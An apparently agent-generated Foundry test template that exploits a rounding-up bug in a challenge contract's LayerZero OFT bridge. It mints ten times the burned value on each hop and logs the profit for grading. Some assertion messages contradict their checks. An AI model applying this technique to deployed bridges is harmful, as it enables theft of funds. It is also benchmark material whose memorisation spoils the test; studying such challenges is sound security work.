// SPDX-License-Identifier: MIT
// AGENT-GENERATED harness: {{STRATEGY_ID}} on {{CHALLENGE_NAME}}.
// Technique: the OFT's LD-to-SD conversion rounds UP, so a sub-unit bridge
// (below one shared unit) credits a FULL shared unit on destination — each
// hop mints ~10x the value the source actually burned (dust inflation).
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {LayerZeroOftDecimalDust, SixDecimalToken} from "../../src/challenges/LayerZeroOftDecimalDust.sol";

contract {{TEST_CONTRACT}} is Test {
    function test_agentSolve() public {
        SixDecimalToken six = new SixDecimalToken();
        address endpoint = makeAddr("endpoint");
        LayerZeroOftDecimalDust oft = new LayerZeroOftDecimalDust(address(six), endpoint);
        address attacker = makeAddr("attacker");

        // 1e11 local wei is BELOW one shared unit (1e12). An honest OFT
        // floors this to 0 shared units (dust dropped); the buggy ceil
        // credits 1 full shared unit.
        six.mint(attacker, 100_000_000_000); // 1e11
        vm.startPrank(attacker);
        six.approve(address(oft), type(uint256).max);
        oft.bridgeOut(100_000_000_000);
        vm.stopPrank();
        assertEq(oft.bridgedDebit(attacker), 1, "sub-unit must round DOWN to zero shared units");

        // Destination mints 1 full shared unit = 1e12 local: 10x the input.
        vm.prank(endpoint);
        oft.bridgeIn(attacker, 1);
        assertEq(six.balanceOf(attacker), 1_000_000_000_000, "round-up minted 10x the bridged value");
        assertGt(six.balanceOf(attacker), 100_000_000_000, "no net value created");
        console2.log("[PROFIT_WEI]", uint256(900_000_000_000)); // 1e12 - 1e11 per hop
    }
}
